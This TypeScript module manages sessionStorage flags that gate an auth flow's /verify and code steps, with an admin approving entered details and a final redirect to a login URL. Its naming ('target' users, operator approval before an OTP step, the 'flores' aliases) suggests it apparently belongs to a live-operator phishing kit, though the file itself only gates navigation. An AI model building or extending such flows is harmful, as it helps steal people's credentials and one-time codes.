/**
 * Client-only auth flow flags so deep links to /verify redirect home
 * unless the user came through the prior step in this tab.
 * Bypass when ALLOW_LOCAL_TESTING is enabled (see TargetFlowGateProvider).
 */

import { LOGIN_REDIRECT_URL } from "@/lib/project-config"

export const TARGET_FLOW_LOGIN = "target_flow_login"
export const TARGET_FLOW_DETAILS_OK = "target_flow_details_ok"

export function setTargetFlowLogin(): void {
  if (typeof window === "undefined") return
  sessionStorage.setItem(TARGET_FLOW_LOGIN, "1")
}

/** Call when admin approves “Verify your details” and the client navigates to the code step. */
export function setTargetFlowDetailsOk(): void {
  if (typeof window === "undefined") return
  sessionStorage.setItem(TARGET_FLOW_DETAILS_OK, "1")
}

export function clearTargetAuthFlow(): void {
  if (typeof window === "undefined") return
  sessionStorage.removeItem(TARGET_FLOW_LOGIN)
  sessionStorage.removeItem(TARGET_FLOW_DETAILS_OK)
}

export function hasTargetFlowLogin(): boolean {
  if (typeof window === "undefined") return false
  return sessionStorage.getItem(TARGET_FLOW_LOGIN) === "1"
}

export function hasTargetFlowDetailsOk(): boolean {
  if (typeof window === "undefined") return false
  return sessionStorage.getItem(TARGET_FLOW_DETAILS_OK) === "1"
}

export const FLORES_REDIRECT_URL = LOGIN_REDIRECT_URL

/** Peer alias — admin Redirect and end-of-flow URLs use this. */
export { LOGIN_REDIRECT_URL }

/** @deprecated Use TARGET_FLOW_* helpers instead */
export const FLORES_SESSION = {
  verify: TARGET_FLOW_LOGIN,
  identity: TARGET_FLOW_DETAILS_OK,
  otp2: "flores_otp2_unused",
} as const
